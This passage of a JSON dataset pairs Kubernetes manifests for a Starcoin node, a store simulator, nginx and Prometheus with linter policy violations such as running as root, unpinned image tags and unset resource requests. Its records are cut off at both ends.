    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-main\n  labels:\n    app: starcoin\n    network: main\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 9\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: main\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.9.2\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/main/starcoin.ipc /sc-data/main/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n main --discover-local\n          true --disable-miner-client true --min-peers-to-propagate 512 --max-peers-to-propagate\n          1024 --max-outgoing-peers 512 --max-incoming-peers 512 -d /sc-data $node_key_flag;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n        livenessProbe:\n          tcpSocket:\n            port: 9840\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 4\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /starcoin/starcoin -n main -d /sc-data node sync status|grep Synchronized\n          initialDelaySeconds: 10\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"starcoin\" does not have a read-only root file system"
  },
  {
    "id": "6859",
    "manifest_path": "data/manifests/the_stack_sample/sample_2501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-main\n  labels:\n    app: starcoin\n    network: main\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 9\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: main\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.9.2\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/main/starcoin.ipc /sc-data/main/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n main --discover-local\n          true --disable-miner-client true --min-peers-to-propagate 512 --max-peers-to-propagate\n          1024 --max-outgoing-peers 512 --max-incoming-peers 512 -d /sc-data $node_key_flag;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n        livenessProbe:\n          tcpSocket:\n            port: 9840\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 4\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /starcoin/starcoin -n main -d /sc-data node sync status|grep Synchronized\n          initialDelaySeconds: 10\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"starcoin\" is not set to runAsNonRoot"
  },
  {
    "id": "6860",
    "manifest_path": "data/manifests/the_stack_sample/sample_2501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-main\n  labels:\n    app: starcoin\n    network: main\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 9\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: main\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.9.2\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/main/starcoin.ipc /sc-data/main/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n main --discover-local\n          true --disable-miner-client true --min-peers-to-propagate 512 --max-peers-to-propagate\n          1024 --max-outgoing-peers 512 --max-incoming-peers 512 -d /sc-data $node_key_flag;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n        livenessProbe:\n          tcpSocket:\n            port: 9840\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 4\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /starcoin/starcoin -n main -d /sc-data node sync status|grep Synchronized\n          initialDelaySeconds: 10\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"starcoin\" has cpu request 0"
  },
  {
    "id": "6861",
    "manifest_path": "data/manifests/the_stack_sample/sample_2501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-main\n  labels:\n    app: starcoin\n    network: main\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 9\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: main\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.9.2\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/main/starcoin.ipc /sc-data/main/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n main --discover-local\n          true --disable-miner-client true --min-peers-to-propagate 512 --max-peers-to-propagate\n          1024 --max-outgoing-peers 512 --max-incoming-peers 512 -d /sc-data $node_key_flag;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n        livenessProbe:\n          tcpSocket:\n            port: 9840\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 4\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /starcoin/starcoin -n main -d /sc-data node sync status|grep Synchronized\n          initialDelaySeconds: 10\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"starcoin\" has memory limit 0"
  },
  {
    "id": "6862",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (smq-sa), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "6863",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"store-simulator\" is using an invalid container image, \"quay.io/ibmcase/eda-store-simulator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6864",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"store-simulator\" does not have a read-only root file system"
  },
  {
    "id": "6865",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"smq-sa\" not found"
  },
  {
    "id": "6866",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"store-simulator\" is not set to runAsNonRoot"
  },
  {
    "id": "6867",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"store-simulator\" has cpu request 0"
  },
  {
    "id": "6868",
    "manifest_path": "data/manifests/the_stack_sample/sample_2502.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: store-simulator\n  name: store-simulator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: store-simulator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: store-simulator\n    spec:\n      containers:\n      - args:\n        - -Dquarkus.http.host=0.0.0.0\n        - -Djava.util.logging.manager=org.jboss.logmanager.LogManager\n        - -Djavax.net.ssl.trustStoreType=jks\n        - -Djavax.net.ssl.trustStore=/deployments/certs/mq-tls/mq-tls.jks\n        - -Djavax.net.ssl.trustStorePassword=my-mq-password\n        - -jar\n        - /deployments/quarkus-run.jar\n        command:\n        - java\n        env:\n        - name: KUBERNETES_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MQ_CCDT_URL\n          value: /deployments/certs/mq-ccdt/mq-ccdt.json\n        - name: JAVA_APP_JAR\n          value: /deployments/quarkus-run.jar\n        envFrom:\n        - configMapRef:\n            name: store-simulator-cm\n        image: quay.io/ibmcase/eda-store-simulator\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: store-simulator\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /q/health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 0\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 10\n      serviceAccount: smq-sa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"store-simulator\" has memory limit 0"
  },
  {
    "id": "6869",
    "manifest_path": "data/manifests/the_stack_sample/sample_2504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-deployment\n  labels:\n    role: app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      role: app\n  template:\n    metadata:\n      labels:\n        role: app\n    spec:\n      containers:\n      - name: app\n        image: flasksidecar\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 50m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app\" is using an invalid container image, \"flasksidecar\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6870",
    "manifest_path": "data/manifests/the_stack_sample/sample_2504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-deployment\n  labels:\n    role: app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      role: app\n  template:\n    metadata:\n      labels:\n        role: app\n    spec:\n      containers:\n      - name: app\n        image: flasksidecar\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 50m\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6871",
    "manifest_path": "data/manifests/the_stack_sample/sample_2504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-deployment\n  labels:\n    role: app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      role: app\n  template:\n    metadata:\n      labels:\n        role: app\n    spec:\n      containers:\n      - name: app\n        image: flasksidecar\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 50m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "6872",
    "manifest_path": "data/manifests/the_stack_sample/sample_2504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-deployment\n  labels:\n    role: app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      role: app\n  template:\n    metadata:\n      labels:\n        role: app\n    spec:\n      containers:\n      - name: app\n        image: flasksidecar\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 50m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "6873",
    "manifest_path": "data/manifests/the_stack_sample/sample_2504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-deployment\n  labels:\n    role: app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      role: app\n  template:\n    metadata:\n      labels:\n        role: app\n    spec:\n      containers:\n      - name: app\n        image: flasksidecar\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 50m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "6874",
    "manifest_path": "data/manifests/the_stack_sample/sample_2506.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3076\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6875",
    "manifest_path": "data/manifests/the_stack_sample/sample_2506.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3076\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "6876",
    "manifest_path": "data/manifests/the_stack_sample/sample_2506.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3076\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "6877",
    "manifest_path": "data/manifests/the_stack_sample/sample_2506.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3076\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "6878",
    "manifest_path": "data/manifests/the_stack_sample/sample_2506.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3076\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "6879",
    "manifest_path": "data/manifests/the_stack_sample/sample_2508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: prometheus\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: prometheus\n        phase: prod\n    spec:\n      securityContext:\n        seccompProfile:\n          type: RuntimeDefault\n      serviceAccountName: prometheus\n      containers:\n      - name: prometheus\n        image: quay.io/prometheus/prometheus:v2.28.0\n        args:\n        - --web.listen-address=0.0.0.0:9090\n        - --config.file=/etc/prometheus/prometheus.yaml\n        - --storage.tsdb.path=/var/lib/prometheus\n        ports:\n        - name: web\n          containerPort: 9090\n        resources:\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: config\n          mountPath: /etc/prometheus\n        - name: rules\n          mountPath: /etc/prometheus/rules\n        - name: data\n          mountPath: /var/lib/prometheus\n        livenessProbe:\n          httpGet:\n            path: /-/healthy\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /-/ready\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n      volumes:\n      - name: config\n        configMap:\n          name: prometheus-config\n      - name: rules\n        configMap:\n          name: prometheus-rules\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus\" does not have a read-only root file system"
  },
  {
    "id": "6880",
    "manifest_path": "data/manifests/the_stack_sample/sample_2508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: prometheus\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: prometheus\n        phase: prod\n    spec:\n      securityContext:\n        seccompProfile:\n          type: RuntimeDefault\n      serviceAccountName: prometheus\n      containers:\n      - name: prometheus\n        image: quay.io/prometheus/prometheus:v2.28.0\n        args:\n        - --web.listen-address=0.0.0.0:9090\n        - --config.file=/etc/prometheus/prometheus.yaml\n        - --storage.tsdb.path=/var/lib/prometheus\n        ports:\n        - name: web\n          containerPort: 9090\n        resources:\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: config\n          mountPath: /etc/prometheus\n        - name: rules\n          mountPath: /etc/prometheus/rules\n        - name: data\n          mountPath: /var/lib/prometheus\n        livenessProbe:\n          httpGet:\n            path: /-/healthy\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /-/ready\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n      volumes:\n      - name: config\n        configMap:\n          name: prometheus-config\n      - name: rules\n        configMap:\n          name: prometheus-rules\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prometheus\" not found"
  },
  {
    "id": "6881",
    "manifest_path": "data/manifests/the_stack_sample/sample_2508.yaml",
